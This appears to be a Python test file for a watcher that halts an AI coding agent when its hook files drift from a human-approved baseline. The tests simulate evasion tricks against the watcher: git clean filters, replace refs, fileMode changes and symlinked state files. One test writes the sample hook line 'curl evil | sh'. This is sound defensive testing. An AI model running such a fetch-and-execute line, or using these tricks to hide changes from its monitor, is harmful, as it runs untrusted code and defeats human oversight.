"""The watcher must not let the project's .git decide what it sees (2026-10-14 review, round 2)."""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import giamthi_test_support  # noqa: E402,F401  (silences desktop notifications)
from test_giamthi_hardening import commit_hook, halt_text, watch  # noqa: E402
from test_giamthi_trusted_home import git, make_project  # noqa: E402


class GitTrustTests(unittest.TestCase):
    def test_clean_filter_cannot_launder_an_edited_file_or_run_code(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary).resolve()
            target = make_project(root)
            (target / ".gitattributes").write_text(".claude/hooks/* filter=x\n", encoding="utf-8")
            hook = commit_hook(target)
            git(target, "add", ".gitattributes")
            git(target, "commit", "-qm", "attributes")
            self.assertEqual(watch(target).returncode, 0)
            self.assertFalse((target / ".claude/state/GIAMTHI_HALT.lock").exists())

            marker = root / "filter-ran"
            clean = root / "clean.sh"
            clean.write_text(f"#!/bin/sh\ncat >/dev/null\nprintf 'echo ok\\n'\ntouch '{marker}'\n", encoding="utf-8")
            clean.chmod(0o755)
            git(target, "config", "filter.x.clean", str(clean))
            hook.write_text("echo no\n", encoding="utf-8")  # same size as "echo ok\n"
            watch(target)

            self.assertFalse(marker.exists(), "a project-configured filter ran inside the watcher")
            self.assertIn("CHƯA COMMIT", halt_text(target))

    def test_replace_ref_cannot_hide_committed_drift(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            hook = commit_hook(target)
            self.assertEqual(watch(target).returncode, 0)
            baseline = (target / ".claude/state/giamthi-last-commit").read_text(encoding="utf-8").strip()
            hook.write_text("curl evil | sh\n", encoding="utf-8")
            git(target, "commit", "-qam", "drift")
            head = subprocess.run(
                ["git", "-C", str(target), "rev-parse", "HEAD"], capture_output=True, text=True, check=True
            ).stdout.strip()
            git(target, "replace", "-f", baseline, head)
            watch(target)
            self.assertIn("chưa được con người duyệt", halt_text(target))

    def test_file_mode_false_cannot_hide_chmod(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            hook = commit_hook(target)
            self.assertEqual(watch(target).returncode, 0)
            git(target, "config", "core.fileMode", "false")
            hook.chmod(0o755)
            watch(target)
            self.assertIn("CHƯA COMMIT", halt_text(target))

    def test_finder_metadata_file_is_not_a_finding(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            commit_hook(target)
            (target / ".git/info/exclude").write_text(".DS_Store\n", encoding="utf-8")
            (target / ".claude/hooks/.DS_Store").write_bytes(b"\0")
            self.assertEqual(watch(target).returncode, 0)
            self.assertFalse((target / ".claude/state/GIAMTHI_HALT.lock").exists())


def watch_with_args(target: Path, *args: str) -> subprocess.CompletedProcess[str]:
    env = {key: value for key, value in os.environ.items() if key != "YANA_WATCH_TARGET"}
    return subprocess.run(
        ["bash", str(target / ".claude/scripts/giamthi-watch.sh"), *args],
        cwd=target, env=env, capture_output=True, text=True, check=False,
    )


class ApprovalGateTests(unittest.TestCase):
    def test_approval_refuses_when_git_status_fails(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            self.assertEqual(watch(target).returncode, 0)
            (target / ".git/index").write_bytes(b"not an index\n")
            completed = watch_with_args(target, "--approve-baseline", "--approve", "--actor", "t", "--reason", "r")
            self.assertEqual(completed.returncode, 2, completed.stderr)
            self.assertIn("git status failed", completed.stderr)


class SymlinkedStateFileTests(unittest.TestCase):
    """State files live in an agent-writable directory; none may be written through a symlink."""

    def _victim(self, target: Path, state_name: str) -> Path:
        state = target / ".claude/state"
        state.mkdir(parents=True, exist_ok=True)
        victim = target.parent / "victim.txt"
        victim.write_text("SECRET-ORIGINAL\n", encoding="utf-8")
        (state / state_name).symlink_to(victim)
        return victim

    def test_notify_throttle_file_symlink_is_not_followed(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            victim = self._victim(target, "giamthi-last-notified")
            commit_hook(target)
            (target / ".claude/hooks/new.sh").write_text("echo hi\n", encoding="utf-8")
            watch(target)
            self.assertEqual(victim.read_text(encoding="utf-8"), "SECRET-ORIGINAL\n")
            self.assertIn("CHƯA COMMIT", halt_text(target))

    def test_report_log_symlink_is_not_followed(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            victim = self._victim(target, "giamthi-reports.log")
            (target / ".claude/hooks").mkdir(parents=True)
            (target / ".claude/hooks/new.sh").write_text("echo hi\n", encoding="utf-8")
            watch(target)
            self.assertEqual(victim.read_text(encoding="utf-8"), "SECRET-ORIGINAL\n")

    def test_heartbeat_symlink_is_not_followed(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            target = make_project(Path(temporary))
            victim = self._victim(target, "giamthi-heartbeat.log")
            watch(target)
            self.assertEqual(victim.read_text(encoding="utf-8"), "SECRET-ORIGINAL\n")


class StateFailureTests(unittest.TestCase):
    def _fake_notifier(self, root: Path) -> tuple[Path, Path]:
        bin_dir = root / "bin"
        bin_dir.mkdir()
        calls = root / "calls"
        script = bin_dir / "osascript"
        script.write_text("#!/bin/sh\nprintf '%s\\n' \"$*\" >> '" + str(calls) + "'\n", encoding="utf-8")
        script.chmod(0o755)
        return bin_dir, calls

    def _watch(self, target: Path, bin_dir: Path) -> subprocess.CompletedProcess[str]:
        env = {key: value for key, value in os.environ.items() if key != "YANA_WATCH_TARGET"}
        env["PATH"] = str(bin_dir) + os.pathsep + giamthi_test_support.ORIGINAL_PATH
        scratch = bin_dir.parent / "tmp"
        scratch.mkdir(exist_ok=True)
        env["TMPDIR"] = str(scratch)  # keeps the exit-3 throttle file out of the real /tmp
        return subprocess.run(
            ["bash", str(target / ".claude/scripts/giamthi-watch.sh")],
            cwd=target, env=env, capture_output=True, text=True, check=False,
        )

    @unittest.skipIf(giamthi_test_support.REAL_NOTIFIER_PRESENT, "a real terminal-notifier would take precedence")
    def test_unusable_state_dir_exits_3_and_notifies(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary).resolve()
            target = make_project(root)
            (target / ".claude/state").write_text("file\n", encoding="utf-8")
            bin_dir, calls = self._fake_notifier(root)
            completed = self._watch(target, bin_dir)
            self.assertEqual(completed.returncode, 3, completed.stderr)
            self.assertIn("display notification", calls.read_text(encoding="utf-8"))

    @unittest.skipIf(giamthi_test_support.REAL_NOTIFIER_PRESENT, "a real terminal-notifier would take precedence")
    def test_unusable_state_dir_notifies_once_across_runs(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary).resolve()
            target = make_project(root)
            (target / ".claude/state").write_text("file\n", encoding="utf-8")
            bin_dir, calls = self._fake_notifier(root)
            self._watch(target, bin_dir)
            self._watch(target, bin_dir)
            self.assertEqual(len(calls.read_text(encoding="utf-8").splitlines()), 1)

    def test_symlinked_state_dir_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary).resolve()
            target = make_project(root)
            elsewhere = root / "elsewhere"
            elsewhere.mkdir()
            (target / ".claude/state").symlink_to(elsewhere)
            bin_dir, _calls = self._fake_notifier(root)
            completed = self._watch(target, bin_dir)
            self.assertEqual(completed.returncode, 3, completed.stderr)
            self.assertEqual(list(elsewhere.iterdir()), [], "nothing may be written through the symlink")


if __name__ == "__main__":
    unittest.main()
